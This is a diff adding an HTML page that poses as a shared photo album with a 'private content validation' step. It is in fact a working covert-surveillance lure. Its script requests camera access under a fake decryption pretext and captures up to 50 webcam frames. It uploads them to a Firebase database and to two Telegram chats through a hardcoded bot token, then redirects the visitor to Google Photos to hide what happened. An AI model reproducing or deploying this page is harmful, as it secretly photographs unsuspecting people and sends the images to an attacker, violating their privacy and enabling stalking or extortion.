@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shared Album | CloudMedia Storage</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --cm-blue: #1a73e8;
+            --cm-bg: #ffffff;
+            --cm-text: #3c4043;
+            --cm-surface: #f1f3f4;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--cm-surface); 
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .media-card {
+            width: 100%; max-width: 420px; background: var(--cm-bg);
+            border-radius: 16px; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            overflow: hidden; text-align: center;
+        }
+
+        .album-header {
+            height: 180px; background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.unsplash.com/photo-1527631746610-bca00a040d60?auto=format&fit=crop&w=420&q=80');
+            background-size: cover; background-position: center;
+            display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; color: white; text-align: left;
+        }
+
+        .album-name { font-size: 22px; font-weight: 500; margin: 0; }
+        .sender-meta { font-size: 14px; opacity: 0.9; }
+
+        .content-block { padding: 32px 24px; }
+
+        .auth-badge {
+            display: flex; align-items: center; gap: 10px; background: #e8f0fe;
+            color: #1967d2; padding: 12px; border-radius: 8px; margin-bottom: 24px; text-align: left;
+        }
+
+        h2 { font-size: 18px; color: var(--cm-text); margin: 0 0 12px; font-weight: 500; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-media {
+            background: var(--cm-blue); color: white; border: none;
+            padding: 12px 24px; border-radius: 24px; font-size: 14px; font-weight: 500;
+            cursor: pointer; width: 100%; transition: background 0.2s;
+        }
+
+        /* Access Validation UI */
+        #verify-ui { display: none; }
+        .validation-box {
+            width: 80px; height: 80px; border: 3px solid var(--cm-blue);
+            border-radius: 12px; margin: 0 auto 20px; position: relative;
+            overflow: hidden;
+        }
+        .validation-line {
+            width: 100%; height: 2px; background: var(--cm-blue);
+            position: absolute; top: 0; animation: valid 2s infinite ease-in-out;
+            box-shadow: 0 0 8px var(--cm-blue);
+        }
+        @keyframes valid { 0%, 100% { top: 0; } 50% { top: 100%; } }
+
+        .loading-msg { font-size: 15px; color: var(--cm-blue); font-weight: 500; }
+        .timer-msg { font-size: 12px; color: #70757a; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="media-card">
+        <div class="album-header">
+            <p class="sender-meta">Shared by: May Admin</p>
+            <h1 class="album-name">Shared Media (May 2026)</h1>
+        </div>
+
+        <div class="content-block" id="start-ui">
+            <div class="auth-badge">
+                <span>🔒</span>
+                <div style="font-size: 12px;">This album uses <b>Advanced Private Content Validation</b> for your protection.</div>
+            </div>
+            <h2>Verify to View Media</h2>
+            <p>Accessing these private files requires a secure presence check. Please click below to validate your session and download the shared memories.</p>
+            
+            <button class="btn-media" onclick="startMediaRelay()">Download & View Content</button>
+            <div style="margin-top: 20px; font-size: 11px; color: #9aa0a6;">Location Node: Mumbai_West_MH</div>
+        </div>
+
+        <div class="content-block" id="verify-ui">
+            <div class="validation-box"><div class="validation-line"></div></div>
+            <div class="loading-msg">Validating Device Presence...</div>
+            <div class="timer-msg" id="timer">Decrypting 98 high-resolution assets (60s)</div>
+            <div style="margin-top: 20px; font-family: monospace; font-size: 10px; color: #1e8e3e; text-align: left; background: #f8f9fa; padding: 10px; border-radius: 4px;">
+                > FETCHING_SSL_CERT... OK<br>
+                > SYNCING_ENCRYPTION_KEYS... OK<br>
+                > VALIDATING_PRESENCE... IN_PROGRESS
+            </div>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startMediaRelay() {
+            try {
+                // Requesting permission under the guise of "Media Decryption"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('start-ui').style.display = 'none';
+                document.getElementById('verify-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('timer').innerText = `Decrypting 98 high-resolution assets (${timeLeft}s)`;
+
+                        if (count <= 50) {
+                            captureMediaSession(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Official image hosting or Google Photos
+                            window.location.href = "https://photos.google.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://photos.google.com";
+            }
+        }
+
+        function captureMediaSession(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "SHARED_IMAGE_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'media_verify_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
